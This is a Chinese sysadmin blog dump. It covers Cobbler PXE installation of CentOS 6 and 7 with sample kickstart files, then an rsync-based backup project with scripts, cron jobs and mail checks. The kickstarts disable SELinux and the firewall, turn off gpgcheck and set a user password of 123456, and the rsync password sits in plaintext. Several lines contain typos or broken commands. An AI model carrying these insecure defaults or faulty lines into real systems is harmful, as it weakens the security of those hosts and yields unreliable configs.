&lt;aclsetup|buildiso|import|list|replicate|report|reposync|sync|validateks|version|signature|get-loaders|hardlink&gt; [options|--help] 导入镜像参数 1234567891011121314151617[root@cobbler-9 ~]# cobbler import --helpUsage: cobbler import [options]Options: -h, --help show this help message and exit --arch&#x3D;ARCH OS architecture being imported --breed&#x3D;BREED the breed being imported --os-version&#x3D;OS_VERSION the version being imported --path&#x3D;PATH local path or rsync location --name&#x3D;NAME name, ex &#39;RHEL-5&#39; --available-as&#x3D;AVAILABLE_AS tree is here, don&#39;t mirror --kickstart&#x3D;KICKSTART_FILE assign this kickstart file --rsync-flags&#x3D;RSYNC_FLAGS pass additional flags to rsync 常见参数注释 12345678cobbler check 核对当前设置是否有问题cobbler list 列出所有的cobbler元素cobbler report 列出元素的详细信息cobbler sync 同步配置到数据目录,更改配置最好都要执行下cobbler reposync 同步yum仓库cobbler distro 查看导入的发行版系统信息cobbler system 查看添加的系统信息cobbler profile 查看配置信息 可单个执行查看帮助信息，例： 1234567891011[root@cobbler-9 ~]# cobbler distrousage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;cobbler distro addcobbler distro copycobbler distro editcobbler distro findcobbler distro listcobbler distro removecobbler distro renamecobbler distro report 导入镜像文件123456789101112131415161718#我的CentOS6.6 和CentOS7的ISO文件已经上传到&#x2F;iso目录，需要使用mount挂载后使用。[root@cobbler-9 ~]# mount -o loop &#x2F;iso&#x2F;CentOS-6.6-x86_64-bin-DVD1.iso &#x2F;mnt&#x2F;#导入操作系统来自&#x2F;mnt目录下[root@cobbler-9 ~]# cobbler import --path&#x3D;&#x2F;mnt --name&#x3D;CentOS-6.6-x86_64 --arch&#x3D;x86_64task started: 2017-08-15_085536_import............looking for &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-6.6-x86_64&#x2F;repodata&#x2F;*comps*.xmlKeeping repodata as-is :&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-6.6-x86_64&#x2F;repodata*** TASK COMPLETE ***#参数注释：# --path 镜像路径# --name 为安装源定义一个名字# --arch 指定安装源是32位、64位、ia64, 目前支持的选项有: x86│x86_64│ia64# 安装源的唯一标示就是根据name参数来定义，如果重复，系统会提示导入失败。#镜像存放目录，cobbler会将镜像中的所有安装文件拷贝到本地一份，放在&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror下的CentOS-6.6-x86_64目录下。因此&#x2F;var&#x2F;www&#x2F;cobbler目录必须具有足够容纳安装文件的空间。 同理，再导入一份CentOS-7.3的操作系统 12345678910#先卸载之前的挂载，重新挂载CentOS7[root@cobbler-9 ~]# umount &#x2F;mnt&#x2F;[root@cobbler-9 ~]# mount -o loop &#x2F;iso&#x2F;CentOS-7-x86_64-Minimal-1611.iso &#x2F;mnt[root@cobbler-9 ~]# cobbler import --path&#x3D;&#x2F;mnt&#x2F; --name&#x3D;CentOS-7.3-x86_64 --arch&#x3D;x86_64task started: 2017-08-15_090352_import............looking for &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-7.3-x86_64&#x2F;repodata&#x2F;*comps*.xmlKeeping repodata as-is :&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-7.3-x86_64&#x2F;repodata*** TASK COMPLETE *** 查看镜像列表： 123[root@cobbler-9 ~]# cobbler distro listCentOS-6.6-x86_64CentOS-7.3-x86_64 镜像文件位置 12[root@cobbler-9 ~]# ls &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-6.6-x86_64 CentOS-7.3-x86_64 config 删除指定的镜像 12[root@cobbler-9 ~]# cobbler profile remove --name&#x3D;CentOS-7xxx[root@cobbler-9 ~]# cobbler distro remove --name&#x3D;CentOS-7xxx 指定ks.cfg文件调整内核参数12345Cobbler使用ks.cfg文件来制定所需要的安装配置，分区，网络，主机名等开机优化操作，还可以指定系统安装相应的软件。CentOS-6.6-x86_64.ksCentOS-7.3-x86_64.ks配置文件见文章底部； Cobbler的默认ks.cfg文件存放位置 12345[root@cobbler-9 ~]# ls &#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;kickstarts&#x2F;default.ks legacy.ks sample_esx4.ks sample_old.seedesxi4-ks.cfg pxerescue.ks sample_esxi4.ks sample.seedesxi5-ks.cfg sample_autoyast.xml sample_esxi5.ksinstall_profiles sample_end.ks(默认使用的ks文件) sample.ks 检查ks.cfg文件是否有语法错误 123[root@cobbler-9]# cd &#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;kickstarts[root@cobbler-9 kickstarts]# ksvalidator CentOS-6.6-x86_64.ks 上传准备好的cfg 文件到/var/lib/cobbler/kickstarts/路径，并修改distro list镜像对应的cfg文件 1234567[root@cobbler-9 kickstarts]# ls -l CentOS*-rw-r--r-- 1 root root 65853 Aug 15 09:13 CentOS-6.6-x86_64.ks-rw-r--r-- 1 root root 53180 Aug 15 09:13 CentOS-7.3-x86_64.ks[root@cobbler-9 kickstarts]# cobbler profile edit --name&#x3D;CentOS-6.6-x86_64 --kickstart&#x3D;&#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;kickstarts&#x2F;CentOS-6.6-x86_64.ks[root@cobbler-9 kickstarts]# cobbler profile edit --name&#x3D;CentOS-7.3-x86_64 --kickstart&#x3D;&#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;kickstarts&#x2F;CentOS-7.3-x86_64.ks CentOS7系统网卡名变成eno…这种，为了运维标准化，我们需要修改为我们常用的eth0，使用下面的参数。但要注意是CentOS7才需要下面的步骤(CentOS6不需要)。 1[root@cobbler-9 kickstarts]# cobbler profile edit --name&#x3D;CentOS-7.3-x86_64 --kopts&#x3D;&#39;net.ifnames&#x3D;0 biosdevname&#x3D;0&#39; 查看安装img镜像文件信息 123456789101112131415161718192021222324252627282930313233343536[root@cobbler-9 kickstarts]# cobbler distro reportName : CentOS-6.6-x86_64 #镜像名称Architecture : x86_64TFTP Boot Files : &#123;&#125;Breed : redhatComment : Fetchable Files : &#123;&#125;Initrd : &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-6.6-x86_64&#x2F;imges&#x2F;pxeboot&#x2F;initrd.imgKernel : &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-6.6-x86_64&#x2F;imges&#x2F;pxeboot&#x2F;vmlinuzKernel Options : &#123;&#125;Kernel Options (Post Install) : &#123;&#125;Kickstart Metadata : &#123;&#39;tree&#39;: &#39;http:&#x2F;&#x2F;@@http_server@@&#x2F;cblr&#x2F;links&#x2F;CenOS-6.6-x86_64&#39;&#125;Management Classes : []OS Version : rhel6Owners : [&#39;admin&#39;]Red Hat Management Key : &lt;&lt;inherit&gt;&gt;Red Hat Management Server : &lt;&lt;inherit&gt;&gt;Template Files : &#123;&#125;Name : CentOS-7.3-x86_64 #镜像名称Architecture : x86_64TFTP Boot Files : &#123;&#125;Breed : redhatComment : Fetchable Files : &#123;&#125;Initrd : &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-7.3-x86_64&#x2F;imges&#x2F;pxeboot&#x2F;initrd.imgKernel : &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-7.3-x86_64&#x2F;imges&#x2F;pxeboot&#x2F;vmlinuzKernel Options : &#123;&#125;Kernel Options (Post Install) : &#123;&#125;Kickstart Metadata : &#123;&#39;tree&#39;: &#39;http:&#x2F;&#x2F;@@http_server@@&#x2F;cblr&#x2F;links&#x2F;CenOS-7.3-x86_64&#39;&#125;Management Classes : []OS Version : rhel7Owners : [&#39;admin&#39;]Red Hat Management Key : &lt;&lt;inherit&gt;&gt;Red Hat Management Server : &lt;&lt;inherit&gt;&gt;Template Files : &#123;&#125; 查看指定的img镜像文件 1[root@cobbler-9 kickstarts]# cobbler distro report --name&#x3D;CentOS-7.3-x86_64 查看所有的cfg配置文件内容 1[root@cobbler-9 kickstarts]# cobbler profile report 可以指定名称查看某一个配置的cfg文件 123456789101112131415161718192021222324252627282930313233[root@cobbler-9 kickstarts]# cobbler profile report --name&#x3D;CentOS-7.3-x86_64Name : CentOS-7.3-x86_64TFTP Boot Files : &#123;&#125;Comment : DHCP Tag : defaultDistribution : CentOS-7.3-x86_64Enable gPXE? : 0Enable PXE Menu? : 1Fetchable Files : &#123;&#125;Kernel Options : &#123;&#39;biosdevname&#39;: &#39;0&#39;, &#39;net.ifnames&#39;: &#39;0&#39;&#125;Kernel Options (Post Install) : &#123;&#125;Kickstart : &#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;kickstarts&#x2F;CentOS-7.3-x86_64.cfgKickstart Metadata : &#123;&#125;Management Classes : []Management Parameters : &lt;&lt;inherit&gt;&gt;Name Servers : []Name Servers Search Path : []Owners : [&#39;admin&#39;]Parent Profile : Internal proxy : Red Hat Management Key : &lt;&lt;inherit&gt;&gt;Red Hat Management Server : &lt;&lt;inherit&gt;&gt;Repos : []Server Override : &lt;&lt;inherit&gt;&gt;Template Files : &#123;&#125;Virt Auto Boot : 1Virt Bridge : xenbr0Virt CPUs : 1Virt Disk Driver Type : rawVirt File Size(GB) : 5Virt Path : Virt RAM (MB) : 512Virt Type : kvm 每次修改为都要执行一次同步 1[root@cobbler-9 kickstarts]# cobbler sync 部署操作系统 使用一台物理机，与cobbler服务器在同一个局域网，然后开机按F12通过网络启动即可。 自动化安装完成后，登陆操作系统检查配置。 自定义登陆界面 打个广告 12345[root@cobbler-9 ~]# vim &#x2F;etc&#x2F;cobbler&#x2F;pxe&#x2F;pxedefault.template修改第3行内容MENU TITLE Cobbler | online ks.cfg update date 2017.8.15 注：企业中一般会以ks.cfg文件作为服务器操作系统初始化标准，所以可以把广告改为文件更新日期，有利于维护 每次修改为都需要执行一次同步 1[root@cobbler-9 ~]# cobbler sync 效果图类似 Cobbler web使用 重置cobbler账号的密码 1htdigest &#x2F;etc&#x2F;cobbler&#x2F;users.digest &quot;Cobbler&quot; root 新建用户 1htdigest &#x2F;etc&#x2F;cobbler&#x2F;users.digest &quot;Cobbler&quot; your_newname 访问cobbler页面 1https:&#x2F;&#x2F;cobbler_server_ip&#x2F;cobbler_web *定制化安装1234567891. Cobbler支持设备的物理MAC地址来区分设备，针对不同设备安装操作系统2. 查看服务器MAC地址，并牢记3. Cobbler可以自定义配置网络接口，通过system来固定机器的IP、掩码、网关、DNS、主机名、等等实现基础环境标准化[root@cobbler-9 kickstarts]# cobbler system add --name&#x3D;linux-Centos7.3-online --mac&#x3D;00:50:56:38:F3:C5 --profile&#x3D;CentOS-7.3-x86_64 \\--ip-address&#x3D;10.10.0.10 --subnet&#x3D;255.255.255.0 --gateway&#x3D;10.10.0.1 --interface&#x3D;eth0 \\--static&#x3D;1 --hostname&#x3D;centos7.3 --name-servers&#x3D;&quot;10.10.0.1&quot; \\--kickstart&#x3D;&#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;kickstarts&#x2F;CentOS-7.3-x86_64.ks#--name 自定义，但不能重复 查看定义的列表 12[root@linux-node1 ~]# cobbler system listlinux-Centos7.3-online 打开MAC地址为”00:50:56:38:F3:C5”的机器发现会自动安装预选的操作系统 检查新安装的设备，IP、掩码、网关、DNS、主机名、等等配置发现与预设的信息一致。 *指定设备系统重装(在需要重装系统的机器上面操作) 有些需要重新安装的系统希望reboot后自动重装 12345678在需要重装的机器上面！！！安装koan安装yum源mv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backupwget -O &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;Centos-7.repoyum clean all &amp;&amp; yum makecacheyum install -y koan 检查在Cobbler上面有可选择的img 1234[root@linux-node2 ~]# koan --server&#x3D;10.10.1.10 --list&#x3D;profiles\\- looking for Cobbler at http:&#x2F;&#x2F;10.10.1.10:80&#x2F;cobbler_apiCentOS-6.6-x86_64CentOS-7.2-x86_64 指定要选择重装的系统 1234567891011121314[root@linux-node2 ~]# koan --replace-self --server&#x3D;10.10.1.10 --profile&#x3D;CentOS-6.6-x86_64\\- looking for Cobbler at http:&#x2F;&#x2F;10.10.1.10:80&#x2F;cobbler_api\\- reading URL: http:&#x2F;&#x2F;10.10.1.10&#x2F;cblr&#x2F;svc&#x2F;op&#x2F;ks&#x2F;profile&#x2F;CentOS-6.6-x86_64install_tree: http:&#x2F;&#x2F;10.10.1.10&#x2F;cblr&#x2F;links&#x2F;CentOS-6.6-x86_64downloading initrd initrd.img to &#x2F;boot&#x2F;initrd.img_koanurl&#x3D;http:&#x2F;&#x2F;10.10.1.10&#x2F;cobbler&#x2F;images&#x2F;CentOS-6.6-x86_64&#x2F;initrd.img\\- reading URL: http:&#x2F;&#x2F;10.10.1.10&#x2F;cobbler&#x2F;images&#x2F;CentOS-6.6-x86_64&#x2F;initrd.imgdownloading kernel vmlinuz to &#x2F;boot&#x2F;vmlinuz_koanurl&#x3D;http:&#x2F;&#x2F;10.10.1.10&#x2F;cobbler&#x2F;images&#x2F;CentOS-6.6-x86_64&#x2F;vmlinuz\\- reading URL: http:&#x2F;&#x2F;10.10.1.10&#x2F;cobbler&#x2F;images&#x2F;CentOS-6.6-x86_64&#x2F;vmlinuz\\- [&#39;&#x2F;sbin&#x2F;grubby&#39;, &#39;--add-kernel&#39;, &#39;&#x2F;boot&#x2F;vmlinuz_koan&#39;, &#39;--initrd&#39;, &#39;&#x2F;boot&#x2F;initrd.img_koan&#39;, &#39;--args&#39;, &#39;&quot;ks&#x3D;http:&#x2F;&#x2F;10.10.1.10&#x2F;cblr&#x2F;svc&#x2F;op&#x2F;ks&#x2F;profile&#x2F;CentOS-6.6-x86_64 ksdevice&#x3D;link kssendmac lang&#x3D; text &quot;&#39;, &#39;--copy-default&#39;, &#39;--make-default&#39;, &#39;--title&#x3D;kick1464941350&#39;]\\- [&#39;&#x2F;sbin&#x2F;grubby&#39;, &#39;--update-kernel&#39;, &#39;&#x2F;boot&#x2F;vmlinuz_koan&#39;, &#39;--remove-args&#x3D;root&#39;]\\- reboot to apply changes 重启需要重装的系统,发现系统已经按照指定的镜像重新安装为CentOS6.6操作系统 1[root@linux-node2 ~]# reboot *.ks附件centos_6.6.ks [注：ks文件内不允许出现中文，即便是注释] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#Install OSinstall#Use network installationurl --url&#x3D;&quot;http:&#x2F;&#x2F;10.10.0.10&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-6.6-x86_64&#x2F;&quot;#System languagelang zh_CN.UTF-8#System keyboardkeyboard us#System timezonetimezone --utc Asia&#x2F;Shanghai#SELinux configurationselinux --disabledfirewall --disabled#Reboot after installationreboot#System authentication methodauthconfig --useshadow --passalgo&#x3D;sha512#Root password#Use command [grub-crypt --sha-512] to generate a password.rootpw --iscrypted $6$H3I9mtaYtcKyOCwd$oquT.LoIPqF9Tk3l1g9Z4uD1GRvOp80.q&#x2F;AFyfx86XaZgddcs.qF1I4K9.qSMpo&#x2F;AC4YcdBe8ftSMBgyq1b&#x2F;R1#System bootloader configuration(Greater than 2T using GPT)#bootloader --location&#x3D;gpt --driveorder&#x3D;sdabootloader --location&#x3D;mbr --driveorder&#x3D;sda#Text mode installationtext#Do not configure the X Window Systemskipx#The system does not configure user information after the first startupfirstboot --disabled#Clear the Master Boot Recordzerombr#Clean the system partition before installing the systemclearpart --all --initlabel#Disk partitioning informationpart &#x2F;boot --fstype&#x3D;&quot;ext4&quot; --size&#x3D;100 --ondisk&#x3D;sdapart swap --fstype&#x3D;&quot;swap&quot; --size&#x3D;8192 --ondisk&#x3D;sdapart &#x2F; --fstype&#x3D;&quot;ext4&quot; --grow --size&#x3D;1 --ondisk&#x3D;sda#Network configuration informationnetwork --bootproto&#x3D;dhcp --device&#x3D;em1 --onboot&#x3D;onnetwork --bootproto&#x3D;dhcp --device&#x3D;em2 --onboot&#x3D;onnetwork --bootproto&#x3D;dhcp --device&#x3D;em3network --bootproto&#x3D;dhcp --device&#x3D;em4%packages@chinese-support@core@server-policy@workstation-policy@system-management-snmpbind-utilslrzszvim-enhanced%end#Configure the yum source %postid lustlost &amp;&gt;; &#x2F;dev&#x2F;null || useradd mongoecho 123456 | passwd –stdin mongocat &gt;&gt; &#x2F;etc&#x2F;yum.repos.d&#x2F;base.repo &lt;&lt; eof [base] name&#x3D;baseserver baseurl&#x3D;http:&#x2F;&#x2F;192.168.1.254&#x2F;yum gpgcheck&#x3D;0 enable&#x3D;1 eof %end centos_7.x.ks 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#version&#x3D;CentOS7.x by garywu. - 2017.08.23install# urlurl --url&#x3D;&quot;http:&#x2F;&#x2F;10.10.0.10&#x2F;cobbler&#x2F;ks_mirror&#x2F;CentOS-7.3-x86_64&#x2F;&quot;# Keyboard layoutskeyboard us# System languagelang zh_CN.UTF-8# System timezonetimezone --utc Asia&#x2F;Shanghai# Reboot after installationreboot# Run the Setup Agent on first bootfirstboot --disableignoredisk --only-use&#x3D;sda# Initialize the logging levellogging --level&#x3D;info# Root passwordrootpw --iscrypted $6$H3I9mtaYtcFyOCwd$oquO.LoIRqY9Tk3l1g9Z4uD1FRvOp80.q&#x2F;AFyfx86XaZgdKcs.qF1I4K9.qSMpo&#x2F;AC4YcdBe8ftSMBgyq1b&#x2F;R1# Firewall configurationfirewall --disabledselinux --disabled# System authorization informationauthconfig --enableshadow --passalgo&#x3D;sha512# Do not configure the X Window Systemskipxtext# clear the source data.zerombrclearpart --all --initlabel# System bootloader configurationbootloader --location&#x3D;mbr# Disk partitioning informationpart &#x2F;boot --fstype&#x3D;&quot;ext4&quot; --size&#x3D;500part swap --fstype&#x3D;&quot;swap&quot; --size&#x3D;8092part &#x2F; --fstype&#x3D;&quot;ext4&quot; --grow --size&#x3D;1# Network information#network --bootproto&#x3D;dhcp --device&#x3D;em1 --onboot&#x3D;off --ipv6&#x3D;auto#network --bootproto&#x3D;dhcp --device&#x3D;em2 --onboot&#x3D;off --ipv6&#x3D;auto#network --hostname&#x3D;localhost.localdomain %packagesbind-utilslrzszvim*%end%postsystemctl disable postfix.service%end 注： 上面的 %post …… %end,意思是可以在系统啥的都配置完之后，最后执行一些命令，比如添加epel源或者检查用户是否存在，如果不存在则创建用户 通过cat方式追加文本，如果文本中包含特殊字符比如: “$” , 需要在其前面加转义符”&quot;。否则变量会丢失。 CentOS7系统中，mbr可以识别2TB以上的硬盘，并且没有gpt一说，所以分区格式使用mbr即可。 最后感谢感谢老男孩、赵班长、徐布斯的付出，原文 关于包组1如果不清楚要安装哪些包组，需要使用system-config-kickstart命令配合X windows环境进行配置ks文件查看。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"自动化","slug":"自动化","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"PXE","slug":"PXE","permalink":"https://garywu520.github.io/tags/PXE/"},{"name":"Cobbler","slug":"Cobbler","permalink":"https://garywu520.github.io/tags/Cobbler/"}]},{"title":"rsync-全网备份项目","slug":"rsync-全网备份项目","date":"2017-08-12T06:06:14.000Z","updated":"2017-08-12T10:40:28.922Z","comments":true,"path":"2017/08/12/rsync-全网备份项目/","link":"","permalink":"https://garywu520.github.io/2017/08/12/rsync-%E5%85%A8%E7%BD%91%E5%A4%87%E4%BB%BD%E9%A1%B9%E7%9B%AE/","excerpt":"定期备份服务器中重要的文件，并且在凌晨00:00执行。备份后发送邮件通知管理员备份状态。","text":"定期备份服务器中重要的文件，并且在凌晨00:00执行。备份后发送邮件通知管理员备份状态。 具体要求如下：123456789101112131415161718192021222324252627281)所有服务器的备份目录必须都为&#x2F;backup。2)要备份的系统配置文件包括但不限于：a.定时任务服务的配置文件(&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root)（适合web和nfs服务器）。b.开机自启动的配置文件(&#x2F;etc&#x2F;rc.local)（适合web和nfs服务器）。c.日常脚本的目录 (&#x2F;server&#x2F;scripts)（适合web和nfs服务器）。d.防火墙iptables的配置文件(&#x2F;etc&#x2F;sysconfig&#x2F;iptables)。e.自己思考下还有什么需要备份呢？3)Web服务器站点目录假定为(&#x2F;var&#x2F;html&#x2F;www)。4)Web服务器A访问日志路径假定为（&#x2F;app&#x2F;logs）5)Web服务器保留打包后的7天的备份数据即可(本地留存不能多于7天，因为太多硬盘会满)6)备份服务器上,保留每周一的所有数据副本，其它要保留6个月的数据副本。7)备份服务器上要按照备份数据服务器的内网IP为目录保存备份，备份的文件按照时间名字保存。8）需要确保备份的数据尽量完整正确，在备份服务器上对备份的数据进行检查，把备份的成功及失败结果信息发给系统管理员邮箱中3)要求：每天晚上00点整在Web服务器上打包备份系统配置文件、网站程序目录及访问日志并通过rsync命令推送 全网备份-项目实践过程 实现rsync数据推送功能 服务端 1234567891011121314151617181920# 安装rpm -qa |grep rsyncyum install -y rsync# rsync配置文件（略）# 添加备份目录的管理用户信息useradd -s &#x2F;sbin&#x2F;nologin -M rsync#创建备份数据的目录mkdir &#x2F;backup -pchown -R rsync:rsync &#x2F;backup# 创建用户认证文件echo &quot;rsync_backup:oldboy123&quot; &gt;&#x2F;etc&#x2F;rsync.passwd (文件路径需要与配置文件一致)chmod 600 &#x2F;etc&#x2F;rsync.passwd# 启动rsync服务rsync --daemonecho &quot;rsync --daemon&quot; &gt;&gt;&#x2F;etc&#x2F;rc.local 开机启动 客户端 12345678910# 安装rpm -qa |grep rsyncyum install -y rsync# 创建用户认证文件echo &quot;oldboy123&quot; &gt;&#x2F;etc&#x2F;rsync.passwd chmod 600 &#x2F;etc&#x2F;rsync.passwd# 测试数据推送功能rsync -avz &#x2F;etc&#x2F;hosts rsync_backup@172.16.1.41::backup --password-file&#x3D;&#x2F;etc&#x2F;rsync.passwd 编写备份脚本 NFS01服务器脚本（rsync客户端） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647①创建备份目录mkdir &#x2F;backup -p②NFS01和web服务器上压缩备份数据到备份目录#NFS服务器压缩tar zcvhf &#x2F;backup&#x2F;systemfile_info.tar.gz &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root &#x2F;etc&#x2F;rc.local &#x2F;server&#x2F;scripts &#x2F;etc&#x2F;sysconfig&#x2F;iptables注：tar打包时使用h参数表示当要打包的数据文件是软链接时不会打包软链接，而是打包真实路径文件③推送推送命令到rsync服务器rsync -avz &#x2F;backup&#x2F; rsync_backup@172.16.1.41::nfsbackup --password-file&#x3D;&#x2F;etc&#x2F;rsync.password④删除7天之前的数据find &#x2F;backup -type f -name &quot;*.tar.gz&quot; -mtime +7 -exec rm &#123;&#125; \\; 方法一find &#x2F;backup -type f -name &quot;*.tar.gz&quot; -mtime +7 |xargs rm -f 方法二find &#x2F;backup -type f -name &quot;*.tar.gz&quot; -mtime +7 -delete 方法三⑤对客户端备份的数据进行指纹验证(指纹文件同备份文件一并rsync到服务器) NFS01服务器：cd &#x2F;backup &amp;&amp; md5sum systemfile_info.tar.gz &gt; systemfile_info_md5.txt PS：【rsync服务器验证】 backup备份服务器指纹验证：cd &#x2F;backup &amp;&amp; md5sum -c systemfile_info.txt [root@backup nfsbackup]# md5sum -c systemfile_info_md5.txt systemfile_info.tar.gz: OK ⑥脚本编写 vim &#x2F;server&#x2F;scripts&#x2F;nfs01_backup.sh ######################################################################## #!&#x2F;bin&#x2F;bash # name: nfs_backup.sh # time: 2017.8.12 # desc: backup rsync client data info # author garywu Backup_Dir&#x3D;&quot;&#x2F;backup&quot;#创建客户端备份目录mkdir $Backup_Dir -p#压缩系统数据到&#x2F;backuptar zchf $Backup_Dir&#x2F;systemfile_info.tar.gz &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root &#x2F;etc&#x2F;rc.local &#x2F;server&#x2F;scripts &#x2F;etc&#x2F;sysconfig&#x2F;iptables#生成系统压缩数据指纹信息cd $Backup_Dir&#x2F; &amp;&amp; md5sum systemfile_info.tar.gz &gt;systemfile_info_md5.txt#推送系统压缩数据以及指纹文件到rsync服务器41的&#x2F;nfsbackup目录中rsync -az $Backup_Dir&#x2F; rsync_backup@172.16.1.41::nfsbackup --password-file&#x3D;&#x2F;etc&#x2F;rsync.password#删除7天之前的数据find $Backup_Dir -type f -name &quot;*.tar.gz&quot; -mtime +7 -delete 12注：脚本调试命令 sh -x &#x2F;server&#x2F;scripts&#x2F;nfs.backup.sh web服务器（rsync客户端） 123456789101112131415161718192021222324252627282930 vim &#x2F;server&#x2F;scripts&#x2F;web01_backup.sh ######################################################################## #!&#x2F;bin&#x2F;bash # name: nfs_backup.sh # time: 2017.8.12 # desc: backup rsync client data info # author garywu date&#x3D;&#96;date +%F_%w&#96; #w显示周几IP&#x3D;&#96;hostname -i&#96; Backup_Dir&#x3D;&quot;&#x2F;backup&quot;#创建客户端备份目录mkdir $Backup_Dir&#x2F;$&#123;IP&#125; -pmkdir &#x2F;var&#x2F;html&#x2F;www &#x2F;app&#x2F;logs -p#压缩系统数据到&#x2F;backuptar zchf $Backup_Dir&#x2F;$&#123;IP&#125;&#x2F;$&#123;date&#125;_$&#123;IP&#125;_systemfile_info.tar.gz &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root &#x2F;etc&#x2F;rc.local &#x2F;server&#x2F;scripts &#x2F;etc&#x2F;sysconfig&#x2F;iptables #大文件分开压缩tar zchf $Backup_Dir&#x2F;$&#123;IP&#125;&#x2F;$&#123;date&#125;_$&#123;IP&#125;_www_info.tar.gz &#x2F;var&#x2F;html&#x2F;www tar zchf $Backup_Dir&#x2F;$&#123;IP&#125;&#x2F;$&#123;date&#125;_$&#123;IP&#125;_www_log.tar.gz &#x2F;app&#x2F;logs#同时给多个文件-生成系统压缩数据指纹信息cd $Backup_Dir&#x2F;$&#123;IP&#125; &amp;&amp; md5sum $(find $Backup_Dir&#x2F;$&#123;IP&#125; -type f -name &quot;$&#123;date&#125;*.tar.gz&quot;) &gt;$&#123;date&#125;_$&#123;IP&#125;_systemfile_info_md5.txt#推送系统压缩数据以及指纹文件到rsync服务器41的&#x2F;nfsbackup目录中rsync -az $Backup_Dir&#x2F;$&#123;IP&#125; rsync_backup@172.16.1.41::nfsbackup --password-file&#x3D;&#x2F;etc&#x2F;rsync.password#删除7天之前的数据find $Backup_Dir&#x2F;$&#123;IP&#125; -type f -name &quot;*.tar.gz&quot; -mtime +7 -delete NFS服务器-rsync客户端定时任务编写 123crontab -e#备份数据信息00 00 * * * sh &#x2F;server&#x2F;scripts&#x2F;nfs01_backup.sh &amp;&gt;&#x2F;dev&#x2F;null web服务器-rsync定时任务编写 123crontab -e#备份数据信息00 00 * * * sh &#x2F;server&#x2F;scripts&#x2F;web01_backup.sh &amp;&gt;&#x2F;dev&#x2F;null rsync服务端脚本 123456789101112131415161718192021222324252627282930313233343536#验证数据完整性find &#x2F;backup&#x2F; -type f -name &quot;finger.txt&quot; |xargs md5sum -c &gt;&#x2F;backup&#x2F;check_info.txt#将验证结果通过邮件发送给管理员mail -s &quot;check_rsync_data mail&quot; 617597237@qq.com &lt;&#x2F;backup&#x2F;check_info.txt 邮件发送邮件方式1echo &quot;oldboy 37&quot; |mail -s &quot;check_rsync_data mail&quot; 617597237@qq.com 邮件发送邮件方式2# 配置邮件服务vim &#x2F;etc&#x2F;mail.rc 增加如下：set from&#x3D;邮箱地址 smtp&#x3D;smtp.163.com set smtp-auth-user&#x3D;邮箱账号 smtp-auth-password&#x3D;授权码信息 smtp-auth&#x3D;login#重启服务&#x2F;etc&#x2F;init.d&#x2F;postfix restart#测试邮件发送mail -s &quot;check_rsync_data mail&quot; 617597237@qq.com &lt;&#x2F;backup&#x2F;check_info.txt 邮件发送邮件方式1echo &quot;oldboy 37&quot; |mail -s &quot;check_rsync_data mail&quot; 617597237@qq.com 邮件发送邮件方式2#删除180天前的数据进行删除，但保留每周一数据find &#x2F;backup -type f -name &quot;*.tar.gz&quot; -mtime +180 ! -name &quot;*_1.tar.gz&quot; |xargs rm -f#################################################################脚本编写vim &#x2F;server&#x2F;scripts&#x2F;backup_server.sh#!&#x2F;bin&#x2F;bash#邮件完整性检查find &#x2F;backup&#x2F; -type f -name &quot;finger.txt&quot; |xargs md5sum -c &gt;&#x2F;backup&#x2F;check_info.txt#邮件发送数据完整性检查状态mail -s &quot;check_rsync_data mail&quot; 617597237@qq.com &lt;&#x2F;backup&#x2F;check_info.txt#删除180天前的数据进行删除，但保留每周一数据find &#x2F;backup -type f -name &quot;*.tar.gz&quot; -mtime +180 ! -name &quot;*_1.tar.gz&quot; |xargs rm -f rsync服务端-定时任务 12#凌晨三点整检查备份过来数据完整性00 3 * * * sh &#x2F;server&#x2F;scripts&#x2F;backup_server.sh 假如今天是8月1日，但是备份时间是晚上00点整，数据备份后正确的是8月2号 12可按如下方法把备份出来的文件日期与实际日期统一Date_info&#x3D;&#96;data +F%_%w -d 